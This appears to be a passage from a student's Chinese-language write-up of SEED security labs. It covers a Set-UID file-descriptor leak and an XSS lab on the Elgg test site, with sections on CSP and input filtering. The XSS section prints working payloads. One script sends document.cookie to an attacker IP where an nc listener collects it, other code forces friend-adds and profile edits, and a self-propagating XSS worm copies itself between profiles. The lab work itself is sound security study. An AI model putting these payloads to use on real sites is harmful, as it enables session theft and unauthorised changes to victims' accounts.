程序允许普通用户以高特权级别执行程序，但根据”最小权限原则”，它们通常在不再需要高特权时放弃这些权限。这是为了确保以最小权限运行程序，以降低潜在的安全风险。</p><p>setuid() 系统调用用于撤销进程的高特权状态。当 Set-UID 程序以高特权执行时，通过调用 setuid(n)，可以将其特权降级为普通用户，设置其RUID、EUID 和SUID 为 n。</p><ul><li>Real User ID（真实用户标识符，RUID）：RUID 是进程实际所属的用户的标识符。这是进程启动时分配给它的用户标识符。</li><li>Effective User ID（有效用户标识符，EUID）：EUID 是决定进程当前权限级别的用户标识符。当进程需要执行某些操作时，操作系统会检查 EUID，以确定进程是否具有足够的权限来执行这些操作。EUID 可能会在进程运行期间改变，通常是通过调用系统调用来改变权限级别。</li><li>Saved Set-User-ID（保存的设置用户标识符，SUID）：SUID 是进程启动时分配给它的用户标识符的一个备份，用于在必要时将 EUID 恢复到原始的 RUID。</li></ul><p>本次task介绍了”capability leaking” 的漏洞。这种漏洞发生在权限降级时，可能导致程序仍然保留了一些特权能力。尽管EUID 已降级为非特权用户，但由于特权能力未被清理，程序仍然具有特权。</p><hr><p><strong>代码：</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> fd;</span><br><span class="line">  <span class="type">char</span> *v[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Assume that /etc/zzz is an important system file,</span></span><br><span class="line"><span class="comment">   * and it is owned by root with permission 0644.</span></span><br><span class="line"><span class="comment">   * Before running this program, you should create</span></span><br><span class="line"><span class="comment">   * the file /etc/zzz first. */</span></span><br><span class="line">  fd = open(<span class="string">&quot;/etc/zzz&quot;</span>, O_RDWR | O_APPEND);        </span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;Cannot open /etc/zzz\n&quot;</span>);</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Print out the file descriptor value</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fd is %d\n&quot;</span>, fd);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Permanently disable the privilege by making the</span></span><br><span class="line">  <span class="comment">// effective uid the same as the real uid</span></span><br><span class="line">  setuid(getuid());                                </span><br><span class="line"></span><br><span class="line">  <span class="comment">// Execute /bin/sh</span></span><br><span class="line">  v[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>; v[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  execve(v[<span class="number">0</span>], v, <span class="number">0</span>);                             </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于程序在打开 &#x2F;etc&#x2F;zzz 文件后并没有关闭文件描述符 fd，因此在新的 &#x2F;bin&#x2F;sh shell 中，可以继续使用 fd 来修改 &#x2F;etc&#x2F;zzz 文件，<u>因为文件描述符是可以在同一进程中传递的；</u></p><blockquote><p>这是因为程序在切换权限之前没有关闭该文件，在新权限下继承了该文件描述符，文件描述符泄露，在关闭文件描述符之前，root操作都能成功执行。</p></blockquote><p>在这个情况下，fd 在新的<code> /bin/sh</code> 的shell 中仍然保持打开状态，所以尽管程序已经禁用了特权。但仍然可以使用 &#x2F;bin&#x2F;sh shell 来执行针对fd&#x3D;3的文件操作，即随意写入数据到&#x2F;etc&#x2F;zzz文件，而不需要特权，</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-02 17.19.45.png" alt="截屏2025-01-02 17.19.45" style="zoom:50%;" /><p>这个漏洞强调了正确的权限管理的重要性，尤其是在使用 Set-UID 程序时，开发者必须小心确保特权和文件描述符等资源受到适当的限制和控制。</p><h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>环境变量是一组动态命名值，可以影响正在运行的进程将在计算机上的运行，我们需要了解环境变量是如何工作的，它们是如何从父进程到子进程，以及它们如何影响系统&#x2F;程序行为，尤其是针对Set-UID程序，这会带来巨大的安全漏洞。</p><p><code>fork()</code>、<code>execve()</code>和<code>system()</code>函数对环境变量传递的方式不尽相同，</p><ul><li><p>fork()函数会将父进程环境变量复制到子进程中</p></li><li><p>execve()函数，不会传递环境变量，但可以将环境变量作为参数（envp）进行传递</p></li><li><p>system()函数新建一个进程并开启一个shell，将环境变量传递进去。</p><blockquote><p><code>system()</code>会调用<code>fork()</code>函数产生子进程，然后子进程调用<code>/bin/sh -c command</code>来执行传入参数的命令。此命令执行完后随即返回父进程，环境变量从父进程传给了子进程中的shell程序</p></blockquote></li></ul><p>对于Set-UID来说普通环境变量的传递同上，但涉及到动态链接的环境变量时，动态链接器在<code> effective uid</code> 和 <code>real uid </code>不一致时，会将 <code>LD_LIBRARY_PATH </code>和 <code>LD_PRELOAD </code>环境变量忽略掉，所以不会传递成功。</p><p>通过修改环境变量，可以修改其他用户调用程序的执行程序，从而执行我们的恶意程序。最后，Set-UID程序很有可能发生权限溢出的问题，攻击者可能利用被泄露的权限对我们的系统造成攻击（如对文件的修改，甚至拿到该权限下的shell），所以使用时一定要谨慎。</p><h1 id="Lab7-XSS攻击实验"><a href="#Lab7-XSS攻击实验" class="headerlink" title="Lab7-XSS攻击实验"></a>Lab7-XSS攻击实验</h1><blockquote><p>发布恶意信息以显示警报窗口——直接嵌入JavaScript代码</p><p>发布恶意信息以显示Cookie——直接嵌入JavaScript代码，document.cookie获取</p><p>从受害者机器上窃取Cookie——插入<img>标签，浏览器会尝试从src字段中的URL来加载图片，从而向攻击者发送了HTTP GET的请求，同时附加了获取cookie的代码</p><p>成为受害者的朋友——模仿正常添加好友的请求信息编写代码，将添加好友的请求通过Ajax发送给了HTTP服务器，包含了X-Requested-with的值，用以通过前端身份验证（Editor HTML模式下编辑；ts和token是抵御CSRF攻击的秘密令牌）</p><p>修改受害者资料——同上构造（发送的POST请求，看以看到里面包含了请求HTTP、Content Type等的值）；判断当前user的guid不等于samy的guid（自己触发后续会失效）</p><p>编写自传播XSS蠕虫：DOM方法和链接方法；提供动态读取来实现蠕虫的自传播</p><p>应对措施：安全插件HTMLawed（移除html标签）；PHP的内置方法htmlspecialchars()（字符编码）</p><p>内容安全策略（CSP）——白名单</p><ul><li><p>从配置文件中导入了CSP头部。配置文件中设置了一个名为Content-Security-Policy的HTTP响应头，用于定义网页的内容安全策略。其指定了默认源（default-src），表示只允许从同一域名加载资源。还指定了脚本源（script-src），表示只允许从这些域名加载JavaScript脚本。</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-02 19.35.05.png" alt="截屏2025-01-02 19.35.05" style="zoom: 50%;" /></li><li><p>PHP脚本中设置了一个名为Content-Security-Policy的HTTP响应头，用于实施内容安全策略，限制页面中可以加载的资源来源。“default-src :self”指定了默认情况下允许加载的资源来源（当前域名）。“script-src :’self’ , ‘nonce-111-111-111’ ,<code>*.example70.com</code>”指定了可以加载JavaScript代码的来源有哪些。其中self表示当前域名，’nonce-111-111-111’表示具有特定nonce值的脚本，<code>*.example70.com</code>表示允许从这个域名加载脚本。</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-02 19.36.52.png" alt="截屏2025-01-02 19.36.52" style="zoom:50%;" /><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-02 19.36.10.png" alt="截屏2025-01-02 19.36.10" style="zoom:50%;" /></li></ul></blockquote><h2 id="Task-1-Posting-a-Malicious-Message-to-Display-an-Alert-Window"><a href="#Task-1-Posting-a-Malicious-Message-to-Display-an-Alert-Window" class="headerlink" title="Task 1: Posting a Malicious Message to Display an Alert Window"></a>Task 1: Posting a Malicious Message to Display an Alert Window</h2><p>在Brief Description一栏中插入XSS代码（将弹出提示框的<code>js</code>代码输入<code>profile</code>中的<code>brief description</code>栏中）：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;XSS Task1&#x27;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>攻击者将恶意JavaScript代码注入到网页内容中，然后当其他人访问包含这个恶意代码内容的页面时，其浏览器会执行该代码。这是因为浏览器在渲染网页时会将HTML和JavaScript代码解释执行。</p><h2 id="Task-2-Posting-a-Malicious-Message-to-Display-Cookies"><a href="#Task-2-Posting-a-Malicious-Message-to-Display-Cookies" class="headerlink" title="Task 2: Posting a Malicious Message to Display Cookies"></a>Task 2: Posting a Malicious Message to Display Cookies</h2><p>在本次任务中，我们要通过<code>XSS</code>攻击获得访问当前页面的用户的Cookie。</p><p>使用<code>document.cookie</code>获得网页的cookie信息，然后将cookie信息通过alert函数进行弹窗展示。</p><p>修改Boby的Profile-Brief description为</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="Task-3-Stealing-Cookies-from-the-Victim’s-Machine"><a href="#Task-3-Stealing-Cookies-from-the-Victim’s-Machine" class="headerlink" title="Task 3: Stealing Cookies from the Victim’s Machine"></a>Task 3: Stealing Cookies from the Victim’s Machine</h2><p>在前两次实验中，都是登录的用户本人在弹窗中看到cookie等信息，而不是攻击者。在本次任务中，我们以攻击者的身份，尝试窃取合法用户的cookie。</p><p>使用<code>document.write()</code>函数将<code>img</code>标签写入文档内，而<code>img</code>属性中制定了一个<code>url</code>，这会使得浏览器向该<code>url</code>发送<code>http</code>请求，以加载该图像，然而该<code>url</code>是攻击者构造的，其作用是将合法用户的cookie通过<code>http</code>请求发送到攻击者的电脑。<u>在DOM插入一个图片，其地址中包含Cookie，请求时就会将Cookie发送给恶意服务器。</u></p><p><strong>实验步骤：</strong></p><p>**第一步：**使用<code>nc -lknv 5555</code>命令，在本机的<code>5555</code>端口上监听tcp连接，并打印详细信息。</p><ul><li>-l: 这是nc的选项，表示在监听模式下运行。它告诉nc开始监听并等待来自远程计算机的连接。</li><li>-k: 这是nc的选项，表示保持监听器持续运行，即使一个连接结束，也会继续等待新的连接。这对于创建一个持续监听的服务器很有用。</li><li>-n: 这是nc的选项，表示不执行DNS反向解析。这有助于提高性能，因为它不会尝试查找IP地址对应的域名。</li><li>-v: 这是nc的选项，表示使用详细输出模式，显示更多关于连接的信息。</li><li>5555: 这是指定的监听端口号。nc将在端口5555上开始监听。</li></ul><p>**第二步：**找到攻击者的IP(10.9.0.1)，嵌入恶意的js代码，实现通过http传输合法用户的cookie。</p><p>命令如下，</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;img src=http://10.9.0.1:5555?c=&#x27;</span></span><br><span class="line">+ <span class="built_in">escape</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>) + <span class="string">&#x27; &gt;&#x27;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>**第三步：**访问嵌入js代码的页面，接收受害者的cookie。</p><p>分别以Alice、Boby、未登录的身份对该页面进行访问，有三个http请求的头部信息，可以看见在请求行中参数c的值就是cookie，所以这三个请求头中的c值分别就是Alice、Boby和未登录用户的cookie。</p><p><strong>分析：</strong></p><p>浏览器在加载页面时会自动使用GET方法请求标签中指定的URL，本意是下载目标url上的图片进而渲染在本地浏览器上。但是在本次实验中，我们将其设置为攻击者的IP地址:特定端口，将受害者的cookie作为参数，那么浏览器就会对攻击者的IP:特定端口发起http请求。攻击者若开启此端口的监听，则可以记录这次http请求的相关信息，并且可以在请求行中到这个值为cookie的参数c，以此实现cookie的盗取。</p><h2 id="Task-4-Becoming-the-Victim’s-Friend"><a href="#Task-4-Becoming-the-Victim’s-Friend" class="headerlink" title="Task 4: Becoming the Victim’s Friend"></a>Task 4: Becoming the Victim’s Friend</h2><p>在本次任务中，我们需要实现一个2005年类似Samy对MySpace网站的攻击，即编写一个XSS蠕虫，使得任意访问Samy主页的用户都会添加Samy为好友。</p><p>我们需要编写一段恶意的JS代码，使得受害者的浏览器在不受到我们的干预下，自动发起HTTP请求，这个HTTP请求的目的就是将用户Samy加为好友。</p><p><strong>实验步骤：</strong></p><p>登录Samy，修改Profile，将构造的代码放入About me文本框中(以HTML的形式，而不是富文本)。登录Alice，查看Samy的个人主页，一进入Profile，网页会自动发起添加Samy为朋友的请求，点开Friends就可以看到已经添加成功了。具体步骤如下，</p><ol><li><p>登录Alice的账号，分析加Samy好友的HTTP请求。</p><p>发现浏览器使用GET方法对此url进行了请求。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.seed-server.com/action/friends/add?friend=59&amp;__elgg_ts=1729764093%2C1729764093&amp;__elgg_token=48Sq79mKt0LihTmBRkKiQA%2C48Sq79mKt0LihTmBRkKiQA</span><br></pre></td></tr></table></figure><p>即浏览器对<code>action/friends/add</code> API进行请求，携带了<code>friend, elgg_ts, elgg_token</code>参数，实现添加好友的功能。</p></li><li><p>根据添加好友的HTTP请求信息构造添加好友的HTTP请求。</p></li><li><p>将构造好的js代码放置在samy个人主页中的About me中。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Ajax</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> ts = <span class="string">&quot;&amp;__elgg_ts=&quot;</span> + elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_ts</span>;</span><br><span class="line">    <span class="keyword">var</span> token = <span class="string">&quot;&amp;__elgg_token=&quot;</span> + elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_token</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Construct the HTTP request to add Samy as a friend.</span></span><br><span class="line">    <span class="keyword">var</span> sendurl = <span class="string">&#x27;http://www.seed-server.com/action/friends/add?friend=59$&#x27;</span> + ts + token;<span class="comment">// FILL IN</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create and send Ajax request to add friend</span></span><br><span class="line">    <span class="title class_">Ajax</span> = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    <span class="title class_">Ajax</span>.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, sendurl, <span class="literal">true</span>);</span><br><span class="line">    <span class="title class_">Ajax</span>.<span class="title function_">send</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>将构造的代码放入About me文本框中(以HTML的形式，而不是富文本)</p></li><li><p>保存之后，使用Alice的账户登录，访问Samy的主页进行测试。<br>刷新页面，发现已经成功添加Samy为好友了，查看friend界面，可以看到samy已经是Alice的friends了，</p></li></ol><p><strong>分析：</strong></p><p>原理仍然同前几个实验，使得受害者的浏览器执行我们插入的恶意js代码，在task3中，我们使受害者的浏览器往特定的url进行http请求。而此次我们将行动变得更有意义一些：将目标地址改为触发添加samy为好友功能的url，当受害者的浏览器执行此恶意代码后，受害者就会自动将samy添加为好友。</p><p><strong>回答问题：</strong></p><p><strong>问题一：代码中的ts和token有什么作用？</strong></p><p>**答：**ts应该表示time stamp，用来确保请求在某个特定的时间内生效，防止不合法的过期的请求。而token应该是用于身份验证的，确保请求来自合法的用户。在对Add功能API请求的url中必须要添加这些参数，否则无法成功。</p><p>ts 和 token其实就是防御CSRF攻击的秘密令牌，在请求时会被发送到服务端进行校验，校验通过请求才有效。这里我们模拟发送添加好友请求自然也要在请求中附带这些令牌值。</p><p><strong>问题二：如果Elgg应用对About Me区域无法开启Text mode，那这次攻击能否会成功？</strong></p><blockquote><p>HTML代码中的标签在Editor Mode下通常会被忽略或转换为它们的文本等价物。例如，<code>&lt;b&gt;</code> 标签可能会被转换为星号（*）或其他文本符号来表示加粗，而 <code>&lt;i&gt;</code> 标签可能会被转换为下划线或其他符号来表示斜体。</p><p>HTML代码中用于定义结构的标签，如 <code>&lt;div&gt;</code>、<code>&lt;span&gt;</code> 或 <code>&lt;p&gt;</code> 等，可能会被移除或转换为简单的换行符或其他文本分隔符。</p><p>HTML代码中用于定义样式的CSS可能会丢失，因为富文本格式通常不支持CSS。这意味着所有颜色、字体大小和类型的设置都会丢失。</p><p>同时，HTML代码中的 <code>&lt;a&gt;</code> 标签定义的链接可能会被转换为纯文本，导致点击这些文本不再能够跳转到相应的网页。</p></blockquote><p>**答：**不可以。因为它会在代码中添加各种标签并转义一些符号，如把<code>&lt;</code>变成<code> &amp;lt;</code>所以攻击不可能成功；下面是一个例子，展现了变换前后的代码；并附上解决方案，</p><p><u>解决方法一：</u>但是可以解决，因为Elgg应用的brief description栏可以实现XSS漏洞，即使我们的js代码可能超出了brief description栏的字数限制，但是仍可以将恶意代码（<code>myscripts.js</code>）托管到某个服务器上，利用src属性请求js代码再执行，如下图。</p><p><u>解决方法二：</u>如果About me只能输入富文本，提交的<code>js</code>代码如下所示，也可以通过截获包并修改post数据也可以达到如上效果。</p><h2 id="Task-5-Modifying-the-Victim’s-Profile"><a href="#Task-5-Modifying-the-Victim’s-Profile" class="headerlink" title="Task 5: Modifying the Victim’s Profile"></a>Task 5: Modifying the Victim’s Profile</h2><p><strong>要求</strong>：使受害者在访问Samy主页的时候，通过执行恶意js代码实现修改受害者的个人资料中的About Me内容。所以，我们会编写一个XSS蠕虫病毒来实现这个任务。（但是这个蠕虫病毒不会自传播，在task6中会实现自传播。）</p><p><strong>实验步骤：</strong></p><p>先探究正常修改个人资料里的About Me的HTTP请求。</p><p>我们登录Alice的账号，对个人资料里的About Me进行修改提交，查看发送的HTTP请求，HTTP报文如下，使用的是POST请求，请求体在最后一行。传递的参数除了修改的内容，还有<code>__elgg_token</code>、<code>__elgg_ts</code>、<code>name</code>、<code>guid</code>。这些参数在elgg对象中都能获取，</p><p>即浏览器对<code>/action/profile/edit</code> API进行了HTTP请求，但是使用的是<code>POST</code>方法，向服务器发送我们修改的About Me中的内容。与GET方法不同的是，POST请求将请求参数放在请求的消息体中，因此不会在URL中可见。</p><p>根据获取到的HTTP请求信息构造我们实施攻击的HTTP请求。接下来将构造好的恶意js代码嵌入samy的个人资料中，先获得samy的guid，值为59，</p><p>然后在samy的个人资料中嵌入代码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> name=<span class="string">&quot;&amp;name=&quot;</span>+elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">name</span>;</span><br><span class="line">    <span class="keyword">var</span> guid=<span class="string">&quot;&amp;guid=&quot;</span>+elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span>;</span><br><span class="line">    <span class="keyword">var</span> ts=<span class="string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_ts</span>;</span><br><span class="line">    <span class="keyword">var</span> token=<span class="string">&quot;&amp;__elgg_token=&quot;</span>+elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_token</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">var</span> description = <span class="string">&quot;&amp;description=Your profile have been attacked by wzh!!!&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> content=token + ts + description + name + guid;</span><br><span class="line">    <span class="keyword">var</span> samyGuid = <span class="number">59</span>;</span><br><span class="line">    <span class="keyword">var</span> sendurl = <span class="string">&quot;http://www.seed-server.com/action/profile/edit&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span> != samyGuid) &#123;</span><br><span class="line">      <span class="comment">// Create and send Ajax request to modify profile</span></span><br><span class="line">      <span class="keyword">var</span> <span class="title class_">Ajax</span> = <span class="literal">null</span>;</span><br><span class="line">      <span class="title class_">Ajax</span> = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">      <span class="title class_">Ajax</span>.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, sendurl, <span class="literal">true</span>);</span><br><span class="line">      <span class="title class_">Ajax</span>.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">      <span class="title class_">Ajax</span>.<span class="title function_">send</span>(content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li>content 变量的内容将作为POST请求的消息体，我们构造content的内容，即可将受害者的个人资料改为我们想要的值。</li><li><code>if(elgg.session.user.guid!=samyGuid)</code>是判断是否为攻击者自己，不能误伤了自己。</li></ul><p>点击保存，然后登录Alice的账号，访问samy主页前的个人简介如下，</p><p>访问Samy的个人主页，然后再查看Alice的个人主页，发现About Me确实被修改了。</p><p>再使用其他用户访问Samy的主页，发现也一样有效果。</p><p><strong>分析：</strong></p><p>原理仍然同前几个实验，使得受害者的浏览器执行我们插入的恶意js代码，在task4中，我们使受害者在访问了Samy主页后会请求添加好友的API，使得受害者会自动添加Samy为好友。而在本次任务中，我们修改url，使得受害者向修改个人资料的API进行访问，并为这次HTTP请求配上合适的参数，以实现修改受害者的个人资料的目的。</p><p>值得注意的是，在task4中，是用GET方法进行请求的，所以参数都在url中，而本次任务中，使用POST方法，提交的数据都位于消息体中。</p><p><strong>回答问题：</strong></p><p><strong>问题三：在本次的恶意的js代码中，分析下图中的代码，为什么我们需要这个if判断，如果没有的话会怎么样？</strong></p><p>这个if语句的作用就是使得Samy的个人主页免于被修改，如果没有这个if判断，那么Samy将恶意代码提交保存之后，会跳转到Samy的个人主页，这时恶意代码就会被执行，将Samy设置的恶意代码给改掉了，这样就无法实施攻击。</p><p>再次访问自己的主页恶意的js代码会被覆盖了。</p><h2 id="Task-6-Writing-a-Self-Propagating-XSS-Worm"><a href="#Task-6-Writing-a-Self-Propagating-XSS-Worm" class="headerlink" title="Task 6: Writing a Self-Propagating XSS Worm"></a>Task 6: Writing a Self-Propagating XSS Worm</h2><p>一个真正的XSS蠕虫需要实现自传播，本次任务的目标就是使得受害者在访问了Samy的主页之后，自己的主页被篡改、自动添加Samy的好友，并且还会将XSS蠕虫复制到自己的主页上，这样其他人访问受害者主页也会像访问Samy的主页一样，同时也会复制一份XSS蠕虫。这样实现XSS蠕虫的大规模传播。</p><p>那么，我们可以通过将恶意js代码写入受害者的个人资料中，这样实现蠕虫的传播效果。</p><p><strong>步骤</strong>：</p><p>将恶意代码嵌入Samy的个人主页中。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script id=<span class="string">&quot;worm&quot;</span> type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> headerTag = <span class="string">&quot;&lt;script id=\&quot;worm\&quot; type=\&quot;text/javascript\&quot;&gt;&quot;</span>; </span><br><span class="line"><span class="keyword">var</span> jsCode = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;worm&quot;</span>).<span class="property">innerHTML</span>;  </span><br><span class="line"><span class="keyword">var</span> tailTag = <span class="string">&quot;&lt;/&quot;</span> + <span class="string">&quot;script&gt;&quot;</span>; </span><br><span class="line"><span class="keyword">var</span> wormCode = <span class="built_in">encodeURIComponent</span>(headerTag + jsCode + tailTag);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> name = <span class="string">&quot;&amp;name=&quot;</span>+elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">name</span>;</span><br><span class="line">    <span class="keyword">var</span> guid = <span class="string">&quot;&amp;guid=&quot;</span>+elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span>;</span><br><span class="line">    <span class="keyword">var</span> ts = <span class="string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_ts</span>;</span><br><span class="line">    <span class="keyword">var</span> token = <span class="string">&quot;&amp;__elgg_token=&quot;</span>+elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_token</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Construct the HTTP request to add Samy as a friend.</span></span><br><span class="line">    <span class="keyword">var</span> addFriendurl = <span class="string">&#x27;http://www.seed-server.com/action/friends/add?friend=59$&#x27;</span> + ts + token;</span><br><span class="line">    <span class="keyword">var</span> description = <span class="string">&quot;&amp;description=&quot;</span> + wormCode</span><br><span class="line">    <span class="keyword">var</span> content= description + token + ts + name + guid;</span><br><span class="line">    <span class="keyword">var</span> samyGuid = <span class="number">59</span>;</span><br><span class="line">    </span><br><span class="line">     <span class="comment">// Construct the content of your url.</span></span><br><span class="line">    <span class="keyword">var</span> sendurl = <span class="string">&quot;http://www.seed-server.com/action/profile/edit&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span> != samyGuid) &#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Ajax</span> = <span class="literal">null</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//create and send Ajax request to add friend</span></span><br><span class="line">        <span class="title class_">Ajax</span> = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">        <span class="title class_">Ajax</span>.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, addFriendurl, <span class="literal">true</span>);</span><br><span class="line">        <span class="title class_">Ajax</span>.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">        <span class="title class_">Ajax</span>.<span class="title function_">send</span>();</span><br><span class="line">       </span><br><span class="line">        <span class="comment">//create and send Ajax request to modify profile</span></span><br><span class="line">        <span class="title class_">Ajax</span> = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">        <span class="title class_">Ajax</span>.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, sendurl, <span class="literal">true</span>);</span><br><span class="line">        <span class="title class_">Ajax</span>.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">        <span class="title class_">Ajax</span>.<span class="title function_">send</span>(content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>保存之后，以Alice的账号登陆，访问Samy主页，发现浏览器的确发起了添加好友的GET请求和修改个人资料的POST请求。</p><p>刷新查看Alice的资料，发现也已经被修改，已经加上samy的好友且恶意代码也被复制到Alice的个人主页中，</p><p>我们再用Boby的账号登录，访问Alice主页，发现js代码同样生效，且Boby的个人主页上也被植入了恶意js代码，</p><p>同理，使用Charlie账号也是如此，结果如下，</p><p><strong>分析：</strong></p><p>原理仍然是通过XSS漏洞让受害者执行恶意js代码，若要实现自传播功能，就要求我们将恶意js代码也复制到受害者上。我们在task5中已经实现修改受害者个人资料的功能了，所以只要将恶意js代码附加到受害者个人资料中的About Me栏中即可。</p><p>值得注意的是，当在 HTTP POST 请求中发送数据并将 Content-Type 设置为 application&#x2F;x-www-form-urlencoded时，数据也应该被编码。该编码方案称为 URL 编码，它将数据中的非字母数字字符替换为 %HH、一个百分号和两个表示字符 ASCII 代码的十六进制数字。可以用encodeURIComponent()函数将其转换为URL编码。</p><h2 id="Elgg’s-Countermeasures"><a href="#Elgg’s-Countermeasures" class="headerlink" title="Elgg’s Countermeasures"></a>Elgg’s Countermeasures</h2><p><strong>英文内容：</strong><br>This sub-section is only for information, and there is no specific task to do. It shows how Elgg defends against the XSS attack. Elgg does have built-in countermeasures, and we have disabled them to make the attack work. Actually, Elgg uses two countermeasures. One is a custom built security plugin HTMLawed, which validates the user input and removes the tags from the input. We have commented out the invocation of the plugin inside the filter_tags() function in input.php, which is located inside vendor&#x2F;elgg&#x2F;elgg&#x2F;engine&#x2F;lib&#x2F;. See the following:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_tags</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// return elgg_trigger_plugin_hook(&#x27;validate&#x27;, &#x27;input&#x27;, null, $var);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$var</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In addition to HTMLawed, Elgg also uses 